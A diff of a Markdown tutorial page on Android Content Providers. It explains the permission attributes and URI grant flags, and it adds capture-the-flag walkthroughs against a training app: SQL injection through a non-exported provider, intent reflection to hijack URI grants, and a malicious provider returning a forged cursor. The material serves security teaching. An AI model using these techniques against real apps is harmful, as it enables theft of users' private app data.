@@ -4,7 +4,7 @@ title: "Content providers"
 
 ## Overview
 
-A **Content Provider** \[[↗](https://developer.android.com/reference/android/content/ContentProvider)] is one of the four fundamental components of an Android application (along with Activities, Services, and Broadcast Receivers).
+A [**Content Provider**](https://developer.android.com/reference/android/content/ContentProvider) is one of the four fundamental components of an Android application (along with Activities, Services, and Broadcast Receivers).
 
 By default, Android uses a concept called "Application Sandboxing". This means App A cannot access App B’s database or files directly. However, sometimes you want to share data. For example WhatsApp needs to access your phone's **Contacts**.
 
@@ -190,6 +190,40 @@ If you want to access a specific provider:
 </queries>
 ```
 
+### android:permission, android:readPermission, android:writePermission
+
+The `<provider>` tag offers three attributes that act as the main security gatekeepers for your data.
+
+`android:permission` is the "all or nothing" attribute. It applies a single permission requirement to both reading and writing data.
+
+```xml
+<provider
+    android:name=".MyProvider"
+    android:authorities="com.example.provider"
+    android:permission="com.example.app.ACCESS_MY_DATA"
+    android:exported="true" />
+```
+
+If a client app wants to interact with this provider in any way (`Query`, `Insert`, `Update`, or `Delete`), it must request and hold the `com.example.app.ACCESS_MY_DATA` permission in its Manifest.
+
+`android:readPermission` & `android:writePermission` attributes allow you to split the security model.
+
+* `android:readPermission` restricts `query()` operations (and `openFile()` in "`r`" mode).
+* `android:writePermission` restricts `insert()`, `update()`, `delete()` operations (and `openFile()` in "`w`" mode).
+
+Example configuration:
+
+```xml
+<provider
+    android:name=".SocialProvider"
+    android:authorities="com.example.social"
+    android:readPermission="android.permission.GLOBAL_SEARCH"
+    android:writePermission="com.example.social.WRITE_POSTS"
+    android:exported="true" />
+```
+
+In this scenario any app with `GLOBAL_SEARCH` permission can read the posts, but only an app with `WRITE_POSTS` can create or delete them.
+
 ---
 
 ## Usage
@@ -311,43 +345,7 @@ public void dump(Uri uri) {
 
 ---
 
-## Sharing Provider access
-
-### android:permission, android:readPermission, android:writePermission
-
-The `<provider>` tag offers three attributes that act as the main security gatekeepers for your data.
-
-`android:permission` is the "all or nothing" attribute. It applies a single permission requirement to both reading and writing data.
-
-```xml
-<provider
-    android:name=".MyProvider"
-    android:authorities="com.example.provider"
-    android:permission="com.example.app.ACCESS_MY_DATA"
-    android:exported="true" />
-```
-
-If a client app wants to interact with this provider in any way (`Query`, `Insert`, `Update`, or `Delete`), it must request and hold the `com.example.app.ACCESS_MY_DATA` permission in its Manifest.
-
-`android:readPermission` & `android:writePermission` attributes allow you to split the security model.
-
-* `android:readPermission` restricts `query()` operations (and `openFile()` in "`r`" mode).
-* `android:writePermission` restricts `insert()`, `update()`, `delete()` operations (and `openFile()` in "`w`" mode).
-
-Example configuration:
-
-```xml
-<provider
-    android:name=".SocialProvider"
-    android:authorities="com.example.social"
-    android:readPermission="android.permission.GLOBAL_SEARCH"
-    android:writePermission="com.example.social.WRITE_POSTS"
-    android:exported="true" />
-```
-
-In this scenario any app with `GLOBAL_SEARCH` permission can read the posts, but only an app with `WRITE_POSTS` can create or delete them.
-
-### grantUriPermissions
+## Sharing Provider access: grantUriPermissions
 
 The attribute `android:grantUriPermissions` is a security feature in the Android Manifest within `<provider>` elements. It controls whether your app can create a "temporary guest pass" for other apps to access specific data they are normally forbidden from touching.
 
@@ -381,7 +379,26 @@ Attribute behavior:
     </provider>
     ```
 
-**Granting the permission in code**
+### FLAG_GRANT_READ_URI_PERMISSION & FLAG_GRANT_WRITE_URI_PERMISSION
+
+These two flags are used to authorize the temporary access.
+
+* `FLAG_GRANT_READ_URI_PERMISSION` -> Constant Value: `1`
+* `FLAG_GRANT_WRITE_URI_PERMISSION` -> Constant Value: `2`
+
+> **Note**: If you decompile an app using **jadx**, you might see a call like `intent.addFlags(3)`. The value **`3`** corresponds to a combination of `FLAG_GRANT_READ_URI_PERMISSION` and `FLAG_GRANT_WRITE_URI_PERMISSION`. This happens because the original source code likely looked something like:
+> ```
+> intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION) 
+> ```
+> The `|` operator is the bitwise OR operator, which is used to combine multiple flag values into a single integer. 
+> ```
+> FLAG_GRANT_READ_URI_PERMISSION      = 0000 0001
+> FLAG_GRANT_WRITE_URI_PERMISSION     = 0000 0010
+> -----------------------------------------------
+> Using | (OR):                       = 0000 0011
+> ```
+
+### Granting the permission with an intent
 
 When a sending app (App A) wants to share a file with a target app (App B), for example via an "Open With" action, **App A must append a flag** to the Intent.
 
@@ -402,6 +419,7 @@ startActivity(intent);
 3. If valid, the OS creates a temporary permission record linking the Content URI, App A, and the Target App (App B).
 4. App B starts and can now call `getContentResolver()`.
 
+> **Note**: Sharing access via `startActivity` is not the only vector to access the provider. When an application transmits an Intent via `startService` `setResult()`, etc., and includes the `FLAG_GRANT_READ_URI_PERMISSION` or `FLAG_GRANT_WRITE_URI_PERMISSION`, the receiving application is granted access to the URI specified in the Intent's data.
 
 <details><summary>Practical example</summary>
 
@@ -528,6 +546,10 @@ public class MainActivity extends Activity {
 
 </details>
 
+### Granting the permission to a specific package
+
+Call the method `Context.grantUriPermission(package, Uri, mode_flags)` for the `content://Uri`, using the desired mode flags. This grants temporary access permission for the content URI to the specified package, according to the value of the the `mode_flags` parameter, which you can set to `FLAG_GRANT_READ_URI_PERMISSION`, `FLAG_GRANT_WRITE_URI_PERMISSION` or both. The permission remains in effect until `revokeUriPermission()` is called to revoke it or until the device reboots.
+
 ---
 
 ## Vulnerabilities
@@ -609,12 +631,12 @@ To retrieve the flag, you need to perform a SQLi as shown below:
 Log:
 
 ```
-evil    com.example.myapplication   D  _id = 1, name = flag30, value = HXT{query-provider-table-1vsd8}, visible = 1
-evil    com.example.myapplication   D  _id = 2, name = flag31, value = HXT{query-uri-matcher-sakj1}, visible = 1
-evil    com.example.myapplication   D  _id = 3, name = flag32, value = HXT{sql-injection-in-provider-1gs82}, visible = 0
+evil    com.example.myapplication   D  _id = 1, name = flag30, value = HXT{...}, visible = 1
+evil    com.example.myapplication   D  _id = 2, name = flag31, value = HXT{...}, visible = 1
+evil    com.example.myapplication   D  _id = 3, name = flag32, value = HXT{...}, visible = 0
 ```
 
-### SQL Injection in a not exported provider (1)
+### Access to a not exported provider (1) (+ SQLi)
 
 Let's start by analyzing the manifest for the `io.hextree.attacksurface` app. We see a `ContentProvider` defined as follows:
 
@@ -760,3 +782,191 @@ protected void onActivityResult(int requestCode, int resultCode, @Nullable Inten
 >     }
 > }
 > ```
+
+### Access to a not exported provider (2) (+ SQLi)
+
+This example demonstrates SQLi in a non-exported provider by exploiting URI permission grants. In the previous example, we accessed the provider by capturing an intent returned via `setResult()`; however, that is not the only vector. When an application transmits an Intent via `startActivity`, `startService`, etc., and includes the `FLAG_GRANT_READ_URI_PERMISSION` or `FLAG_GRANT_WRITE_URI_PERMISSION`, the receiving application is granted access to the URI specified in the Intent's data.
+
+Let's start by analyzing the manifest for the `io.hextree.attacksurface` app. We see a `ContentProvider` defined as follows:
+
+```xml
+<provider
+    android:name="io.hextree.attacksurface.providers.Flag33Provider2"
+    android:enabled="true"
+    android:exported="false"
+    android:authorities="io.hextree.flag33_2"
+    android:grantUriPermissions="true"/>
+```
+
+Notice that while `android:exported` is `false`, `android:grantUriPermissions` is set to `true` like in the example before. So now let's take a look at the `Flag33Activity2`:
+
+```xml
+<activity
+    android:name="io.hextree.attacksurface.activities.Flag33Activity2"
+    android:exported="false"/>
+```
+
+```java
+public class Flag33Activity2 extends AppCompactActivity {
+    ...
+    public Flag33Activity2() {...}
+
+    @Override
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        String stringExtra = getIntent().getStringExtra("secret");
+        if (stringExtra == null) {
+            Intent intent = new Intent();
+            intent.setAction("io.hextree.FLAG33");
+            intent.setData(Uri.parse("content://io.hextree.flag33_2/flags"));
+            intent.addFlags(1);
+            startActivity(intent);
+            return;
+        }
+    }
+}
+```
+
+We can exploit this vulnerability by creating an attacking application that listens for the `io.hextree.FLAG33` action. When the vulnerable app starts our activity, it passes the read permission along with it:
+
+```xml
+<activity
+    android:name=".MainActivity"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.intent.category.LAUNCHER" />
+    </intent-filter>
+    <intent-filter>
+        <action android:name="io.hextree.FLAG33"/>
+        <category android:name="android.intent.category.DEFAULT" />
+        <data android:scheme="content" />
+    </intent-filter>
+</activity>
+```
+
+```java
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        ...
+        Intent intent = getIntent();
+        if (intent.getAction().equals("io.hextree.FLAG33")) {
+            Uri uri = intent.getData();
+            String[] projection = {"name", "value"};
+            String selection = "'' UNION SELECT title, content FROM Note";
+            dump(uri, projection ,selection);
+        }
+    }
+
+    public void dump(Uri uri, String[] projection, String selection) {...}
+}
+```
+
+### Hijacking content provider access with intent reflection
+
+While apps can intentionally share access to Content Providers, sometimes apps can also be forced to do it unintentionally. Consider a scenario where an application receives an incoming Intent and simply returns it to the sender. In this case, we can simply start the activity using an Intent that targets a private Content Provider URI and includes the `FLAG_GRANT_READ_URI_PERMISSION` flag. By reflecting the Intent, the app grants the attacker access.
+
+```java
+public class Flag8Activity extends AppCompactActivity {
+
+    @Override
+    protected void onCreate(Bundle bundle) {
+        ...
+        if (callingActivity != null) {
+            if (callingActivity.getClassName().contains("Hextree")) {
+                ...
+            } else {
+                Log.i("Flag8", "access denied");
+                setResult(0, getIntent());
+            }
+        }
+    }
+}
+```
+
+### Vulnerability in consuming Content Providers
+
+Previously, we examined vulnerabilities on the "sending" side where apps insecurely expose content. Now, we shift our focus to the "receiving" side. A significant threat model exists where applications expect to consume data from an external Content Provider. If the receiving app trusts the structure or content of the returned data without validation, it can be exploited.
+
+> **Note**: This example is derived from a [FileProvider vulnerability](https://offsecnotes.frankheat.io/Android/Application%20security/IPC/file%20provider.html#vulnerability-in-consuming-fileprovider) and illustrates the implementation of a Content Provider.
+
+The target activity, `MainActivity`, accepts an Intent containing a URI. It queries this URI using a ContentResolver and expects the resulting Cursor to contain specific metadata:
+
+```java
+public class MainActivity extends AppCompactActivity {
+
+    @Override
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        Uri data = getIntent().getData();
+        Cursor cursorQuery = null;
+        try {
+            try {
+                cursorQuery = getContentResolver().query(data, null, null, null, null);
+                if (cursorQuery != null && cursorQuery.moveToFirst()) {
+                    String string = cursorQuery.getString(cursorQuery.getColumnIndex("_display_name"));
+                    long j = cursorQuery.getLong(cursorQuery.getColumnIndex("_size"));
+                    if ("../flag37.txt".equals(string) && j == 1337) {
+                        success(this);
+                    }
+                }
+                if (cursorQuery == null) {
+                    return;
+                }
+            } catch (Exception e) {...}
+            cursorQuery.close();
+        } catch (Throwable th) {...}
+    }
+}
+```
+
+To trigger the `success()` method, we must control the data returned by the query. We need to serve a Cursor containing two columns (`_display_name` and `_size`) with the exact values `../flag37.txt` and `1337`.
+While we could implement a full SQLite database to back our Content Provider, it is much more efficient to use a `MatrixCursor`. A `MatrixCursor` allows us to create a dynamic, in-memory table without needing a database file.
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest ...>
+    <application ...
+        <provider
+            android:name=".AttackProvider"
+            android:authorities="com.example.myapplication.attack.provider"
+            android:enabled="true"
+            android:exported="true"></provider>
+    </application>
+</manifest>
+```
+
+```java
+package com.example.myapplication;
+...
+
+public class AttackProvider extends ContentProvider {
+    public AttackProvider() {}
+
+    @Override
+    public Cursor query(Uri uri, String[] projection, String selection,
+                        String[] selectionArgs, String sortOrder) {
+
+        MatrixCursor cursor = new MatrixCursor(new String[]{"_display_name", "_size"});
+        cursor.addRow(new Object[]{"../flag37.txt", 1337});
+
+        return cursor;
+    }
+}
+```
+
+```java
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        ...
+        Intent intent = new Intent();
+        intent.setClassName("io.test", "io.test.MainActivity");
+        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        startActivity(intent);
+    }
+}
+```
